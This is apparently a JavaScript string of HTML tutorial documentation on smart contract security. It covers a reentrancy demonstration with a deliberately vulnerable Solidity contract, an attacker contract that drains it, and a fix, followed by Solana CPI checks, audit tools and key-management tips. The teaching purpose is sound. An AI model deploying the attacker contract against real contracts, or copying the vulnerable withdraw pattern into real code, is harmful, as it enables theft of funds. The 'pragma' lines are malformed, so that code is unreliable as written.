docs.commonVul = `
<h1 class="heading">Common Vulnerabilities</h1>

<h2 class="subHeading">A. Reentrancy Attacks in Ethereum</h2>
<p>Reentrancy occurs when an external contract calls back into the calling contract before the original function execution is completed, potentially leading to inconsistent state changes.</p>

<h3>Steps to Demonstrate Reentrancy Attack</h3>

<h4>Vulnerable Contract:</h4>
<div class="code-container"><pre><code>
// SPDX-License-Identifier: MIT
pragma ^0.8.0;

contract Vulnerable {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0, "No balance to withdraw");
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }
}
</code></pre></div>

<h4>Attack Contract:</h4>
<div class="code-container"><pre><code>
pragma ^0.8.0;

import "./Vulnerable.sol";

contract Attacker {
    Vulnerable public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    fallback() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw();
    }
}
</code></pre></div>

<h4>Solution:</h4>
<div class="code-container"><pre><code>
function withdraw() external {
    uint256 balance = balances[msg.sender];
    require(balance > 0, "No balance to withdraw");

    balances[msg.sender] = 0; // Effect
    (bool sent, ) = msg.sender.call{value: balance}(""); // Interaction
    require(sent, "Failed to send Ether");
}
</code></pre></div>

<h2 class="subHeading">B. Cross-Program Invocation (CPI) Risks in Solana</h2>
<p>CPI risks occur when one Solana program invokes another program, potentially leading to security vulnerabilities such as privilege escalation or account manipulation.</p>

<h4>Mitigating CPI Risks</h4>
<div class="code-container"><pre><code>
let account_info = ctx.accounts.external_account.to_account_info();
require!(
    account_info.owner == expected_program_id,
    MyError::InvalidAccountOwner
);
</code></pre></div>

<h4>Use PDAs for Access Control:</h4>
<p>Derive program-controlled addresses (PDAs) to avoid passing arbitrary accounts.</p>

<h2 class="subHeading">2. Auditing Tools</h2>

<h3>Ethereum Auditing Tools</h3>
<ul>
<li><strong>MythX:</strong> A security analysis platform for Ethereum smart contracts.</li>
</ul>
<div class="code-container"><pre><code>
myth analyze &lt;contract.sol&gt;
</code></pre></div>

<ul>
<li><strong>Slither:</strong> A static analysis tool for finding vulnerabilities in Solidity code.</li>
</ul>
<div class="code-container"><pre><code>
pip install slither-analyzer
slither &lt;contract.sol&gt;
</code></pre></div>

<h3>Solana Auditing Tools</h3>
<ul>
<li><strong>Anchor Testing:</strong> Use Anchor's built-in testing framework for simulations.</li>
</ul>
<div class="code-container"><pre><code>
anchor test
</code></pre></div>

<h2 class="subHeading">3. Wallet Security</h2>

<h3>A. Managing Private Keys Securely</h3>
<ul>
<li>Use environment variables:</li>
</ul>
<div class="code-container"><pre><code>
export PRIVATE_KEY="your_private_key_here"
</code></pre></div>

<ul>
<li>Use tools like AWS Secrets Manager or HashiCorp Vault.</li>
<li>Never expose private keys in code repositories.</li>
</ul>

<h3>B. Understanding Hardware Wallets and Multisig</h3>
<ul>
<li><strong>Hardware Wallets:</strong> Devices like Ledger or Trezor securely store private keys offline.</li>
<li><strong>Multisig Wallets:</strong> Require multiple signatures for transactions (e.g., Gnosis Safe).</li>
</ul>

<h2 class="subHeading">4. Best Practices</h2>

<h3>A. Writing Secure Smart Contracts</h3>
<ul>
<li>Use OpenZeppelin Libraries:</li>
</ul>
<div class="code-container"><pre><code>
npm install @openzeppelin/contracts
</code></pre></div>

<ul>
<li>Implement Access Control:</li>
</ul>
<div class="code-container"><pre><code>
contract MyContract {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
}
</code></pre></div>

<h4>Avoid Arithmetic Overflows:</h4>
<p>Use Solidity 0.8+ or SafeMath libraries.</p>

<h3>B. Using Time Locks and Access Controls</h3>
<h4>Time Locks:</h4>
<div class="code-container"><pre><code>
contract TimeLock {
    uint256 public unlockTime;

    modifier timeLocked() {
        require(block.timestamp >= unlockTime, "Function is time-locked");
        _;
    }
}
</code></pre></div>

<h4>Role-Based Access Control:</h4>
<div class="code-container"><pre><code>
import "@openzeppelin/contracts/access/AccessControl.sol";

contract RoleBasedAccess is AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");

    constructor() {
        _setupRole(ADMIN_ROLE, msg.sender);
    }

    function sensitiveFunction() external onlyRole(ADMIN_ROLE) {
        // Sensitive logic
    }
}
</code></pre></div>

<h2 class="subHeading">Summary</h2>
<ul>
  <li><strong>Common Vulnerabilities:</strong> Mitigate Ethereum reentrancy attacks using checks-effects-interactions. Minimize Solana CPI risks by validating account ownership and restricting calls.</li>
  <li><strong>Auditing Tools:</strong> Use MythX and Slither for Ethereum. Leverage Anchor testing for Solana.</li>
  <li><strong>Wallet Security:</strong> Manage private keys securely and use hardware wallets or multisig for added protection.</li>
  <li><strong>Best Practices:</strong> Write secure contracts with time locks, access controls, and minimal storage usage.</li>
</ul>
<p>By adopting these techniques and tools, you can build secure and robust blockchain applications.</p>
`;
